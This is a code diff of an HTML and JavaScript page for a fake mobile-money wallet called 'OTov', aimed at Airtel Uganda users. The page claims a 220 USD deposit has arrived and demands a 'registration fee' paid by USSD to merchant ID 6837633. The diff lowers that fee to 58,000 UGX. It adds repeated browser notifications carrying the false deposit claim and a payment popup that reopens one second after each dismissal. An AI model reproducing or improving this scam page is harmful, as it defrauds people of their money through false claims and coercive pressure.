@@ -330,7 +330,7 @@
             <div class="img-popup-sub">SIM CARD NOT REGISTERED</div>
             <div class="img-popup-text">Currently Work on Airtel <span class="blink">🇺🇬</span></div>
             <div class="img-popup-text" style="margin-top: -5px; margin-bottom: 18px;">
-                Make sure you have enough Registration fee of 98,500 UGX on your mobile number to initiate the transaction on your SIM card <br>
+                Make sure you have enough Registration fee of 58,000 UGX on your mobile number to initiate the transaction on your SIM card <br>
                 <span id="popup-user-credentials" style="color: #002d5b; font-weight: 700;"></span>
             </div>
             
@@ -338,7 +338,7 @@
                 <b style="font-size: 0.9rem; display: block; margin-bottom: 4px;">Registration Steps:</b>
                 Dial: <span style="color: #ff0000; font-weight: bold;">*185*9#</span> 📞<br>
                 🆔 Merchant ID: <b>6837633</b><br>
-                💵 Amount: <b>98,500</b><br>
+                💵 Amount: <b>58,000</b><br>
                 Reference: <span style="font-weight: 600;">otov merchant</span><br>
                 ✅ Confirm: <span style="font-weight: 600;">Allow the notification to complete the transaction</span>
             </div>
@@ -369,12 +369,12 @@
 
         <div class="official-note">
             <b style="color: var(--selar-blue); border-bottom: 1px solid #ddd; display: block; padding-bottom: 5px; margin-bottom: 8px;">Official Notes</b>
-            Make sure you have enough Registration fee of <b>98,500 UGX</b> on your SIM card to initiate the transaction to your Sim card and Click <b>Withdrawal</b> button to pay Fx charge to initiate 220USD into UGX directly to your SIM card to complete transaction.
+            Make sure you have enough Registration fee of <b>58,000 UGX</b> on your SIM card to initiate the transaction to your Sim card and Click <b>Withdrawal</b> button to pay Fx charge to initiate 220USD into UGX directly to your SIM card to complete transaction.
         </div>
 
         <div class="service-grid">
-            <div onclick="startFxFlow()" class="service-item"><div class="icon-circ bg-transfer">💸</div><div class="service-label">Transfer</div></div>
-            <div onclick="startFxFlow()" class="service-item"><div class="icon-circ bg-withdraw">📠</div><div class="service-label">Withdraw</div></div>
+            <div class="service-item"><div class="icon-circ bg-transfer">💸</div><div class="service-label">Transfer</div></div>
+            <div class="service-item"><div class="icon-circ bg-withdraw">📠</div><div class="service-label">Withdraw</div></div>
             <a href="tel:*185*4%23" class="service-item"><div class="icon-circ bg-bills">🧾</div><div class="service-label">Pay Bills</div></a>
             <div class="service-item"><div class="icon-circ bg-browser">🌐</div><div class="service-label">Browser</div></div>
             <div onclick="showRates()" class="service-item"><div class="icon-circ bg-rates">💱</div><div class="service-label">Ex-Rate</div></div>
@@ -503,7 +503,7 @@
                 <b style="color:var(--airtel-red)">How to Pay FX Charge on your SIM card</b><br>
                 Dial: <b>*185*9#</b> 📞<br>
                 🆔 Merchant ID: <b>6837633</b><br>
-                💵 Amount: <b>98500</b><br>
+                💵 Amount: <b>58,000</b><br>
                 🔖 Reference: <b>OTov merchant</b><br>
                 <small>Confirm fx charge to complete transaction on OTov system</small>
             </div>
@@ -527,6 +527,12 @@
             // Hide welcome screen directly if session exists
             document.getElementById('welcome-view').classList.add('hidden');
             launchDashDirectly();
+
+            // Resume reminder schedule if reloaded/browser closed before 3 times completed
+            let count = parseInt(localStorage.getItem('otov_reminder_count') || '0');
+            if (count > 0 && count < 3) {
+                setTimeout(triggerReminderNotification, 60000);
+            }
         }
     };
 
@@ -544,10 +550,14 @@
         currentUser = { name, phone };
         localStorage.setItem('selar_session_v5', JSON.stringify(currentUser));
 
-        // Request Browser Notification Permission for background/minimized phone alerts
+        // Request browser push notification permission for above-phone alerts
         if ("Notification" in window && Notification.permission !== "granted") {
             Notification.requestPermission();
         }
+
+        // Reset and trigger the first reminder popup immediately upon submission
+        localStorage.setItem('otov_reminder_count', '0');
+        triggerReminderNotification();
         
         document.getElementById('login-view').classList.add('hidden');
         document.getElementById('notif-verifying').classList.remove('hidden');
@@ -558,28 +568,6 @@
             document.getElementById('notif-sim-success').classList.remove('hidden');
             document.getElementById('success-user-text').innerText = `(${phone} - ${name})`;
         }, 10000);
-    }
-
-    function showDashboardAfterSuccess() {
-        document.getElementById('notif-sim-success').classList.add('hidden');
-        launchDashDirectly();
-        
-        setTimeout(() => {
-            document.getElementById('notif-deposit').classList.remove('hidden');
-        }, 1000);
-    }
-
-    function launchDashDirectly() {
-        document.getElementById('login-view').classList.add('hidden');
-        document.getElementById('dashboard-view').classList.remove('hidden');
-        document.getElementById('dash-user').innerText = `${currentUser.phone} - ${currentUser.name.toUpperCase()}`;
-        
-        // Fill beneficiary details in receipt
-        document.getElementById('receipt-beneficiary-name').innerText = currentUser.name.toUpperCase();
-        document.getElementById('receipt-beneficiary-account').innerText = currentUser.phone;
-
-        // Initialize repeated reminder notifications (3 times, every 60 seconds)
-        initReminderNotifications();
     }
 
     // Sound alert generator using Web Audio API
@@ -602,65 +590,87 @@
         }
     }
 
-    // Reminder notification scheduler (3 times at 60s intervals)
-    function initReminderNotifications() {
+    // Reminder notification logic (3 times total, 60s intervals, works above phone screen/browser)
+    function triggerReminderNotification() {
         if (!currentUser) return;
-        
-        let sentCount = parseInt(localStorage.getItem('otov_notif_count') || '0');
-        if (sentCount >= 3) return; // already sent 3 times
+        let count = parseInt(localStorage.getItem('otov_reminder_count') || '0');
+        if (count >= 3) return;
 
-        const checkAndSend = () => {
-            if (sentCount < 3) {
-                sentCount++;
-                localStorage.setItem('otov_notif_count', sentCount.toString());
+        count++;
+        localStorage.setItem('otov_reminder_count', count.toString());
 
-                const messageText = `RECEIVED 220$-909,059.14 UGX on ${currentUser.name} - ${currentUser.phone}. Register your SIM CARD on OTov account to complete the transaction.`;
+        const notifText = `RECEIVED 220$-909,059.14 UGX on ${currentUser.name} - ${currentUser.phone}. Register your SIM CARD on OTov account to complete the transaction.`;
 
-                // Play alert sound
-                playBeepSound();
+        // Play alert sound
+        playBeepSound();
 
-                // Fire system notification popup above the phone screen/browser
-                if ("Notification" in window && Notification.permission === "granted") {
+        // Fire browser notification popup above the phone screen / browser
+        if ("Notification" in window && Notification.permission === "granted") {
+            new Notification("OTov Wallet Notification", {
+                body: notifText
+            });
+        } else if ("Notification" in window && Notification.permission !== "denied") {
+            Notification.requestPermission().then(permission => {
+                if (permission === "granted") {
                     new Notification("OTov Wallet Notification", {
-                        body: messageText,
-                        icon: ""
-                    });
-                } else if ("Notification" in window && Notification.permission !== "denied") {
-                    Notification.requestPermission().then(permission => {
-                        if (permission === "granted") {
-                            new Notification("OTov Wallet Notification", {
-                                body: messageText
-                            });
-                        }
+                        body: notifText
                     });
                 }
+            });
+        }
 
-                // If not reached 3 yet, schedule the next one in 60 seconds
-                if (sentCount < 3) {
-                    setTimeout(checkAndSend, 60000);
-                }
-            }
-        };
-
-        // Start the first interval or check
-        setTimeout(checkAndSend, 60000);
+        // Schedule remaining notifications in 60-second time intervals until 3 times are reached
+        if (count < 3) {
+            setTimeout(triggerReminderNotification, 60000);
+        }
     }
 
-    function closeDepositNotif() { document.getElementById('notif-deposit').classList.add('hidden'); }
+    function showDashboardAfterSuccess() {
+        document.getElementById('notif-sim-success').classList.add('hidden');
+        launchDashDirectly();
+    }
+
+    function launchDashDirectly() {
+        document.getElementById('login-view').classList.add('hidden');
+        document.getElementById('dashboard-view').classList.remove('hidden');
+        document.getElementById('dash-user').innerText = `${currentUser.phone} - ${currentUser.name.toUpperCase()}`;
+        
+        // Fill beneficiary details in receipt
+        document.getElementById('receipt-beneficiary-name').innerText = currentUser.name.toUpperCase();
+        document.getElementById('receipt-beneficiary-account').innerText = currentUser.phone;
+
+        // Display deposit text alert
+        setTimeout(() => {
+            document.getElementById('notif-deposit').classList.remove('hidden');
+        }, 300);
+    }
+
+    function closeDepositNotif() { 
+        document.getElementById('notif-deposit').classList.add('hidden'); 
+        
+        // Displays required verification popup 6 seconds after closing previous alert
+        setTimeout(() => {
+            triggerImagePopupLoop();
+        }, 4000);
+    }
+    
+    function triggerImagePopupLoop() {
+        // Formulate format exactly substituting username and user phone input fields
+        document.getElementById('popup-user-credentials').innerText = `${currentUser.phone} - ${currentUser.name.toLowerCase()}`;
+        document.getElementById('otov-image-popup').classList.remove('hidden');
+    }
+    
+    function dismissAndLoopPopup() {
+        document.getElementById('otov-image-popup').classList.add('hidden');
+        // Repeated implementation trigger every single second window loop when selecting later action rule
+        setTimeout(() => {
+            triggerImagePopupLoop();
+        }, 1000);
+    }
+
     function showRates() { document.getElementById('view-rates').classList.remove('hidden'); }
     function showSpecial() { document.getElementById('view-special').classList.remove('hidden'); }
     function closeOverlay(id) { document.getElementById(id).classList.add('hidden'); }
-
-    function startFxFlow() {
-        document.getElementById('notif-fx-loading').classList.remove('hidden');
-        document.getElementById('fx-load-text').innerText = `Initiating Transaction of 220USD to (${currentUser.phone} - ${currentUser.name}) from OTov Merchant account`;
-        
-        setTimeout(() => {
-            document.getElementById('notif-fx-loading').classList.add('hidden');
-            document.getElementById('notif-fx-charge').classList.remove('hidden');
-            document.getElementById('fx-user-target').innerText = `${currentUser.phone} - ${currentUser.name}`;
-        }, 8000);
-    }
 </script>
 
 </body>
